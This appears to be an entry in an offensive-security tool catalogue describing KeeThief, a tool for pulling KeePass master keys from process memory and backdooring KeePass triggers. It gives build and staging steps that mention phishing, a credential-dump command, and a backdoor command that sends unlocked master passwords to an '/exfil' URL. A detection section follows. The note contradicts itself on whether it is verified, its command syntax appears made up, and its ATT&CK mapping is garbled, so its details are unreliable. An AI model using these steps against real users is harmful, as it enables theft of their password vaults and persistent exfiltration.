---
id: b0d49566-fbaf-4d92-bf88-ad513c0e276b
type: tool
verified: true
created_at: '2019-08-28T21:17:21.608674Z'
updated_at: '2023-10-01T00:00:00Z'
platforms:
  - Windows
tags:
  - credential-access
  - post-exploitation
  - keephief
  - memory-extraction
url: 'https://github.com/GhostPack/KeeThief'
commands:
  - '[[commands/keethief-dump-credentials-from-memory]]'
  - '[[commands/keethief-backdoor-keystore-trigger]]'
  - '[[commands/keethief-enumerate-triggers]]'
validated: true
---

# KeeThief

**Status**: Unverified

## Overview

KeeThief is a .NET-based tool designed for offensive security operations targeting KeePass 2.x password managers. It enables the extraction of sensitive key material (such as master keys and entry credentials) directly from the memory of running KeePass processes and allows for the backdooring and enumeration of the KeePass trigger system to facilitate persistence and credential exfiltration.

## Description

KeeThief operates by interfacing with the KeePass application's memory and configuration files. In post-exploitation scenarios, it can dump unlocked database contents without needing the master password, making it valuable for red team engagements where users rely on KeePass for credential storage. The backdooring feature modifies the KeePass trigger system to send data (e.g., master passwords) to attacker-controlled endpoints upon events like database unlocks. It requires the target to have KeePass 2.x installed and running but does not need elevated privileges for basic operations.

## Features

- **Memory Dumping**: Extracts credentials from active KeePass sessions without file access.
- **Trigger Backdooring**: Injects custom triggers to exfiltrate data on KeePass events (e.g., unlock, save).
- **Trigger Enumeration**: Lists all configured triggers to identify existing persistence mechanisms.
- **Config Modification**: Safely alters KeePass.ini without corrupting the database.
- **Output Flexibility**: Supports console output or file export for dumped data.

## Installation

### Requirements

- .NET Framework 4.0 or later (pre-installed on most Windows systems).
- Windows OS (tested on Windows 7+).
- Access to the target user's session where KeePass is running.

### Install Commands

```powershell
# Clone the repository
git clone https://github.com/GhostPack/KeeThief.git
cd KeeThief

# Build using dotnet (if source is modified)
dotnet build

# Or download precompiled binary from releases
# Place KeeThief.exe in your working directory
```

For red team use, compile on a development machine and transfer the KeeThief.exe binary to the target via existing access (e.g., SMB, phishing).

## Basic Usage

```powershell
.\KeeThief.exe --help
```

This displays all available commands and options.

### Common Options

| Option | Description |
|--------|-------------|
| `-h, --help` | Show help message and usage |
| `-v, --verbose` | Enable verbose logging for debugging |
| `-outfile <file>` | Specify output file for dumps or enumerations |

## Examples

### Example 1: Basic Usage

```powershell
.\KeeThief.exe dumpcreds
```

Dumps credentials from the current KeePass session to console.

### Example 2: Advanced Usage

```powershell
.\KeeThief.exe backdoor -TriggerName "Exfil" -TriggerUrl "http://192.168.1.100/exfil"
```

Backdoors KeePass to exfiltrate data on unlock.

## MITRE ATT&CK Mapping

This tool is commonly associated with:

### Techniques

- [[Windows Credential Manager]] Cached Domain Credentials (KeePass as password store)
- [[Registry Run Keys - Startup Folder]] Registry Run Keys / Startup Folder (via triggers for persistence)
- [[Exfiltration Over Command and Control Channel]] Exfiltration Over C2 Channel

### Tactics

- [[Credential Access]] Credential Access
- [[Persistence]] Persistence
- [[Exfiltration]] Exfiltration

## Detection

Indicators and methods for detecting this tool's usage:

- **Process Monitoring**: Look for KeeThief.exe or suspicious .NET processes accessing lsass.exe or KeePass.exe memory.
- **File Changes**: Modifications to KeePass.ini in %APPDATA%\KeePass\ with new triggers containing external URLs.
- **Network Traffic**: Outbound HTTP/HTTPS requests from KeePass.exe to unusual domains/ports on database events.
- **Memory Forensics**: Tools like Volatility to detect credential dumping from KeePass processes.
- **Event Logs**: Windows Event ID 4688 for KeeThief.exe execution; PowerShell logging if invoked via script.

Enable Windows Defender Application Control (WDAC) or monitor for unsigned .NET binaries.

## Related Procedures

```dataview
TABLE name as "Procedure", verified as "Verified"
FROM "procedures"
WHERE contains(tools, this.file.link)
SORT name ASC
LIMIT 10
```

## Related Tools

- [[tools/Mimikatz]] (for broader credential dumping)
- [[SharpDPAPI]] (for DPAPI-protected KeePass data)

## References

- Official GitHub: https://github.com/GhostPack/KeeThief
- Blog Post: https://posts.specterops.io/operational-guidance-for-offensive-user-dpapi-abuse-1fb7fac8b107 (related context)
- MITRE ATT&CK: https://attack.mitre.org/techniques/T1555/004/
